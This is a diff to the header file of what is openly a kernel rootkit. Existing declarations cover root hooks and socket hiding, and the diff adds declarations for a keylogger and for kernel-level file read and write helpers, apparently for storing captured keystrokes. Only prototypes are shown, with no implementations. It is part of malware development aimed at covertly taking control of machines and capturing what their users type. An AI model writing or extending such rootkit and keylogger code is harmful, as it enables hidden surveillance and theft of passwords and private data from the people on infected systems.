@@ -22,5 +22,22 @@ void stop_root_hook(void);
 int hide_sock(void);
 int remove_sock_hook(void);
 
+// keylogger
+int start_key_logger(void);
+int stop_key_logger(void);
+
+// logger function 
+// open file 
+struct file * driver_file_open(const char *path, int flags, int mode);
+
+// close file
+void driver_file_close(struct file *filp);
+
+// write to file
+int driver_file_write(struct file *file, unsigned long long offset, unsigned char *data, unsigned int size);
+
+// read from file 
+int driver_file_read(struct file *file, unsigned long long offset, unsigned char *data, unsigned int size);
+
 #endif /* ROOTKIT_H */
 
